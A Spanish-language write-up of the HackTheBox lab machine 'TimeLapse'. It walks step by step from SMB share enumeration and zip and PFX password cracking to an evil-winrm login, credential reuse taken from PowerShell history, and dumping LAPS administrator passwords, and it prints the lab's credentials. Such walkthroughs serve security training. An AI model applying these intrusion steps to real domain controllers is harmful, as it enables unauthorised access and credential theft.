---
title: HTB - TimeLapse
author: conde
date: 2022-08-21 14:43:00 -03000 
categories: [HackTheBox, Dificultad Fácil]
tags: [htb, guide]
math: true
mermaid: true
image:
  src: https://i.postimg.cc/DwZFYmHG/Timelapse.png
  width: 500
  height: 200
---

## Indice

- [Enumeración](#enumeración)
- [Ganando acceso al sistema](#ganando-acceso-al-sistema)
- [Escalada de privilegios](#escalada-de-privilegios)

### Enumeración

Comenzamos con una enumeración de puertos por TCP con nmap.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.152 -oG OpenPorts
```

- Resultado nmap
    - **53/tcp    open  domain**
    - **88/tcp    open  kerberos-sec**
    - **135/tcp   open  msrpc**
    - **139/tcp   open  netbios-ssn**
    - **389/tcp   open  ldap**
    - **445/tcp   open  microsoft-ds**
    - **464/tcp   open  kpasswd5**
    - **593/tcp   open  http-rpc-epmap**
    - **636/tcp   open  ldapssl**
    - **3268/tcp  open  globalcatLDAP**
    - **3269/tcp  open  globalcatLDAPssl**
    - **5986/tcp  open  wsmans**
    - **9389/tcp  open  adws**
    - **49667/tcp open  unknown**
    - **49673/tcp open  unknown**
    - **49674/tcp open  unknown**
    - **49694/tcp open  unknown**
    - **53672/tcp open  unknown**

Podemos ver que es un controlador de dominio, lo que vamos a hacer ahora, es ver que recursos tiene compartidos. 

```bash
smbclient -L 10.10.11.152 -N
```

- Resultado smbclient
    - ADMIN$
    - C$
    - IPC$
    - NETLOGON
    - Shares
    - SYSVOL

Podemos ver que tiene una carpeta interesantes llamada **shares**. Vamos a conectarnos a ellas, y vemos el contenido que tiene dentro. 

- Indicamos 4 y 2 barras para **escaparlas**

```bash
smbclient \\\\10.10.11.152\\shares
```

Una vez que entramos y investigamos un poco podemos ver un zip interesantes, que vamos a descargar a nuestro equipo. 

```bash
get winrm_backup.zip
```

Si intentamos descomprimir el zip, no pide una clave por lo que vamos a probar a realizar fuerza bruta con una herramienta propia para cracking de zips. 
- **-D** → Modo diccionario
- **-u** → Modo descomprimir
- **-p** → Usar una cadena como contraseña.

```bash
fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
```

Genial, hemos podido obtener la clave que es `supremelegacy`.  Vamos a descomprimirlo usando la clave que nos ha devuelto. 

```bash
unzip winrm_backup
```

Una vez descomprimido podemos ver un fichero pfx, si miramo el nombre del zip nos puede dar una pista. Si recordamos, **evil-winrm**, nos permite realizar una conexión haciendo uso del  certificado y la clave privada, por lo que vamos a intentar sacar la contraseña del pfx para generar el certificado y la clave privada. 

```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
```

Ahora vamos a crackear ese hash obtenido. 

```bash
john -w /usr/share/wordlists/rockyou.txt pfx.hash --rule /usr/share/john/rules/rockyou-30000.rule
```

Genial, la hemos obtenido, la clave es `thuglegacy`. Vamos a generar nuestro certificado y nuestra clave privada. Comenzamos con la clave privada.

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out kprivada.pem -nodes
```

Ahora, sacamos el certificado. 

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificado.pem
```

### Ganando acceso al sistema

- Pasamos la clave privada a un .key.

```bash
cat kprivada.pem > kprivada.key
```

- Pasamos el certificado a un .cert.

```bash
cat certificado.pem > certificado.cert
```

Ahora que ya hemos obtenido ambas cosas, vamos a conectarnos con evil-winrm. 
- -S → Habilitar SSL 
- -k → Clave Privada (PATH)
- -c → Clave Publica (PATH)
- -i → IP del equipo remoto o hostname

```bash
evil-winrm -S -k kprivada.key -c certificado.cert -i 10.10.11.152
```

Listo, ya estamos dentro del S.O, genial, ya podemos ver la flag del usuario. Vamos a ver que usuario somos de varias formas.

```powershell
whoami
whoami /user
[System.Environment]::UserName
```

Vemos que somos el usuario legaccy, vamos a dirigirnos al escritorio, y vamos a ver la flag. 

```powershell
gc C:\Users\legaccy\Desktop\user.txt
```

### Escalada de privilegios

Vamos a pasar el archivo winpeas.bat a nuestra máquina victima y lo vamos a ejecutar. 

- Donwload [**winpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

```powershell
./winpeas.bat
```

Vemos un fichero sospechosos, llamado **ConsoleHost_history.txt**. Dentro del podemos ver que hay un usuario con permisos, que ejecuta comandos con privilegios. Vamos a usar las variables del fichero para nosotros generar una conexión y ejecutar comandos como ese usuario. 

```powershell
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
```

Ahora vamos a ejecutar un comandos que nos va a permitir ver la contraseña del usuario admin. 

```powershell
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
```

Bien, nos ha devuelto una contraseña que es **8p4Uc,AC5lJ9E]P9X7#3$10@**. Vamos a cerrar esta sesión y conectarnos como el usuario administrador por evil-winrm de nuevo. 

```powershell
evil-winrm -u 'Administrator' -p '8p4Uc,AC5lJ9E]P9X7#3$10@' -i 10.10.11.152  -S
```

Ahora que nos conectamos como administrador, ya podemos ver la flag del root, si no sabemos donde se ubica podemos usar el siguiente comando: 

```powershell
Get-ChildItem -Path C:\ root.txt -Recurse 2>$null
```
